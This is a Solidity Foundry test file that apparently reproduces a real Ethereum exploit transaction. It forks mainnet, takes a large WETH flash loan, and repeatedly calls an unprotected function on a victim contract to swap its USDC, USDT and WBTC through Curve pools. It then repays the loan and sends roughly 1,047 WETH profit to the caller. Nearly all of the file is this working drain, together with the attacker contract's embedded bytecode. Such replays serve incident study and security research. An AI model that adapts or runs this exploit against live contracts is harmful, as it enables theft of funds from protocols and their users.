// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38
// https://etherscan.io/address/0x46d9B3dFbc163465ca9E306487CbA60bC438F5a2

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    address p8;
    address p9;
}

interface I {
    function exchange(uint256, uint256, uint256, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function transfer(address, uint256) external payable;
    function approve(address, uint256) external payable;
    function flashLoanSimple(address, address, uint256, bytes memory, uint16) external payable;
}

contract Xeadf is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38");
    }

    address constant x05f0 = 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5;
    address constant x2260 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x8787 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xbebc = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd51a = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    function test1() public {
        // vm.startPrank(0x46d9B3dFbc163465ca9E306487CbA60bC438F5a2, 0x46d9B3dFbc163465ca9E306487CbA60bC438F5a2);

        vm.createSelectFork("http://localhost:18545", 18523343); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x9afa682fc313aa2d77b139ca7b9c80561f3c7728a1d2005232f7da91a997f9cc));

        // https://explorer.phalcon.xyz/tx/eth/0x9afa682fc313aa2d77b139ca7b9c80561f3c7728a1d2005232f7da91a997f9cc
        this.x9afa682f();
        // https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38
        x20a9341f();
    }

    function test2() public {
        // vm.startPrank(0x46d9B3dFbc163465ca9E306487CbA60bC438F5a2, 0x46d9B3dFbc163465ca9E306487CbA60bC438F5a2);

        vm.createSelectFork("http://localhost:18545", 18523131); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x9afa682fc313aa2d77b139ca7b9c80561f3c7728a1d2005232f7da91a997f9cc
        this.x9afa682f();
        vm.warp(1699399463);
        vm.roll(18523343);
        // https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38
        x20a9341f();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18523343); // tx.blockNumber - 1

        vm.warp(1699399463);
        vm.roll(18523344);
        // https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38
        x20a9341f();
    }

    function x9afa682f() public {
        _constructor_();
    }

    function x20a9341f() public {
        I(x8787).flashLoanSimple(r, xc02a, 27255000000000000000000, "", 0);
        // uint256 v1 = 1047161413417997701244;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "1047161413417997701244 (1047.1614 ether)");
        I(xc02a).transfer(tx.origin, v1);
        // uint256 v2 = 1047161413417997701244;
        uint256 v2 = I(xc02a).balanceOf(tx.origin);
        console2.log("I(xc02a).balanceOf(tx.origin)\t->", "1047161413417997701244 (1047.1614 ether)");
    }

    function executeOperation(address, uint256, uint256, address, bytes memory) public {
        // uint256 v1 = 610000001612;
        uint256 v1 = I(xa0b8).balanceOf(x05f0);
        console2.log("I(xa0b8).balanceOf(x05f0)\t->", uint256(610000001612));
        x05f0.call(abi.encodeWithSelector(0xf6ebebbb, v1, 0, xa0b8, xdac1, xbebc, 0, 0));
        // uint256 v2 = 1194647407421;
        uint256 v2 = I(xdac1).balanceOf(x05f0);
        console2.log("I(xdac1).balanceOf(x05f0)\t->", uint256(1194647407421));
        x05f0.call(abi.encodeWithSelector(0xf6ebebbb, v2, 0, xdac1, xc02a, xd51a, 0, 0));
        // uint256 v3 = 1000555329;
        uint256 v3 = I(x2260).balanceOf(x05f0);
        console2.log("I(x2260).balanceOf(x05f0)\t->", uint256(1000555329));
        x05f0.call(abi.encodeWithSelector(0xf6ebebbb, v3, 0, x2260, xc02a, xd51a, 0, 0));
        I(xc02a).approve(xd51a, 27255000000000000000000);
        I(xd51a).exchange(2, 1, 27255000000000000000000, 0);
        // uint256 v4 = 1089167187134893950663;
        uint256 v4 = I(xc02a).balanceOf(x05f0);
        console2.log("I(xc02a).balanceOf(x05f0)\t->", "1089167187134893950663 (1089.1671 ether)");
        x05f0.call(abi.encodeWithSelector(0xf6ebebbb, 1339836373860080209147, 0, xc02a, x2260, xd51a, 0, 0));
        // uint256 v5 = 47603811692;
        uint256 v5 = I(x2260).balanceOf(r);
        console2.log("I(x2260).balanceOf(r)\t\t->", uint256(47603811692));
        I(x2260).approve(xd51a, v5);
        I(xd51a).exchange(1, 2, v5, 0);
        I(xc02a).approve(x8787, 27268627500000000000000);

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function _constructor_() public {
        bytes memory rt =
            hex"60806040526004361061004a5760003560e01c80631b11d0ff1461004c57806320a9341f14610080578063592e9de1146100a057806382a7f794146100b5578063dba5e917146100d5575b005b34801561005857600080fd5b5061006c610067366004610b6c565b6100ea565b604051901515815260200160405180910390f35b34801561008c57600080fd5b5061004a61009b366004610c16565b61043d565b3480156100ac57600080fd5b5061004a6105e2565b3480156100c157600080fd5b5061004a6100d0366004610c2f565b610636565b3480156100e157600080fd5b5061004a6106d2565b600080546001600160a01b0316321461010257600080fd5b6003546001600160a01b0316331461011957600080fd5b6001600160a01b038416301461012e57600080fd5b6101366106f7565b61013e6108a9565b61014661092d565b60025460405163095ea7b360e01b81526001600160a01b039182166004820152602481018890529088169063095ea7b3906044016020604051808303816000875af1158015610199573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101bd9190610c53565b5060028054604051630b68372160e31b815260048101929092526001602483015260448201889052600060648301526001600160a01b031690635b41b90890608401600060405180830381600087803b15801561021957600080fd5b505af115801561022d573d6000803e3d6000fd5b505050506102396109b1565b6040516370a0823160e01b8152306004820152732260fac5e5542a773aa44fbcfedf7c193bc2c5999060009082906370a0823190602401602060405180830381865afa15801561028d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102b19190610c75565b60025460405163095ea7b360e01b81526001600160a01b0391821660048201526024810183905291925083169063095ea7b3906044016020604051808303816000875af1158015610306573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061032a9190610c53565b5060028054604051630b68372160e31b815260016004820152602481019290925260448201839052600060648301526001600160a01b031690635b41b90890608401600060405180830381600087803b15801561038657600080fd5b505af115801561039a573d6000803e3d6000fd5b50506003546001600160a01b03808d16935063095ea7b39250166103be8a8c610c8e565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610409573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061042d9190610c53565b5060019998505050505050505050565b6000546001600160a01b0316331461045457600080fd5b60408051602081018252600080825260035492516310ac2ddf60e21b815273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2936001600160a01b0316916342b0b77c916104ad91309187918991889190600401610ce4565b600060405180830381600087803b1580156104c757600080fd5b505af11580156104db573d6000803e3d6000fd5b50506000546040516370a0823160e01b815230600482015261056493506001600160a01b039182169250908516906370a0823190602401602060405180830381865afa15801561052f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105539190610c75565b6001600160a01b0385169190610a7f565b600080546040516370a0823160e01b81526001600160a01b039182166004820152908416906370a0823190602401602060405180830381865afa1580156105af573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105d39190610c75565b116105dd57600080fd5b505050565b6000546001600160a01b031633146105f957600080fd5b600080546040516001600160a01b03909116914780156108fc02929091818181858888f19350505050158015610633573d6000803e3d6000fd5b50565b6000546001600160a01b0316331461064d57600080fd5b6000546040516370a0823160e01b8152306004820152610633916001600160a01b0390811691908416906370a0823190602401602060405180830381865afa15801561069d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c19190610c75565b6001600160a01b0384169190610a7f565b6000546001600160a01b031633146106e957600080fd5b6000546001600160a01b0316ff5b6001546040516370a0823160e01b81526001600160a01b03909116600482015263f6ebebbb60e01b9060009073bebc44782c7db0a1a60cb6fe97d0b483032ff1c7908290819073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb489073dac17f958d2ee523a2206206994597c13d831ec790839083906370a08231906024015b602060405180830381865afa158015610794573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107b89190610c75565b6040805160248101839052604481018a90526001600160a01b038681166064830152858116608483015289811660a483015263ffffffff891660c48301526fffffffffffffffffffffffffffffffff881660e4808401919091528351808403909101815261010490920183526020820180516001600160e01b03166001600160e01b03198e1617905260015492519394509092911690610859908390610d44565b6000604051808303816000865af19150503d8060008114610896576040519150601f19603f3d011682016040523d82523d6000602084013e61089b565b606091505b505050505050505050505050565b6001546040516370a0823160e01b81526001600160a01b03909116600482015263f6ebebbb60e01b9060009073d51a44d3fae010294c616388b506acda1bfaae46908290819073dac17f958d2ee523a2206206994597c13d831ec79073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290839083906370a0823190602401610777565b6001546040516370a0823160e01b81526001600160a01b03909116600482015263f6ebebbb60e01b9060009073d51a44d3fae010294c616388b506acda1bfaae469082908190732260fac5e5542a773aa44fbcfedf7c193bc2c5999073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290839083906370a0823190602401610777565b6001546040516370a0823160e01b81526001600160a01b039091166004820181905263f6ebebbb60e01b9160009173d51a44d3fae010294c616388b506acda1bfaae46918391829173c02aaa39b223fe8d0a0e5c4f27ead9083c756cc291732260fac5e5542a773aa44fbcfedf7c193bc2c599918491319084906370a0823190602401602060405180830381865afa158015610a51573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a759190610c75565b6107b89190610c8e565b604080516001600160a01b038481166024830152604480830185905283518084039091018152606490920183526020820180516001600160e01b031663a9059cbb60e01b1790529151600092839290871691610adb9190610d44565b6000604051808303816000865af19150503d8060008114610b18576040519150601f19603f3d011682016040523d82523d6000602084013e610b1d565b606091505b5091509150818015610b47575080511580610b47575080806020019051810190610b479190610c53565b610b5057600080fd5b5050505050565b6001600160a01b038116811461063357600080fd5b60008060008060008060a08789031215610b8557600080fd5b8635610b9081610b57565b955060208701359450604087013593506060870135610bae81610b57565b9250608087013567ffffffffffffffff80821115610bcb57600080fd5b818901915089601f830112610bdf57600080fd5b813581811115610bee57600080fd5b8a6020828501011115610c0057600080fd5b6020830194508093505050509295509295509295565b600060208284031215610c2857600080fd5b5035919050565b600060208284031215610c4157600080fd5b8135610c4c81610b57565b9392505050565b600060208284031215610c6557600080fd5b81518015158114610c4c57600080fd5b600060208284031215610c8757600080fd5b5051919050565b60008219821115610caf57634e487b7160e01b600052601160045260246000fd5b500190565b60005b83811015610ccf578181015183820152602001610cb7565b83811115610cde576000848401525b50505050565b600060018060a01b03808816835280871660208401525084604083015260a0606083015283518060a0840152610d218160c0850160208801610cb4565b61ffff93909316608083015250601f91909101601f19160160c001949350505050565b60008251610d56818460208701610cb4565b919091019291505056fea2646970667358221220a6a09e5764cf89d66c862c101326837cd7536410eeaaaafa8364630a3f9b7a4a64736f6c634300080d0033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
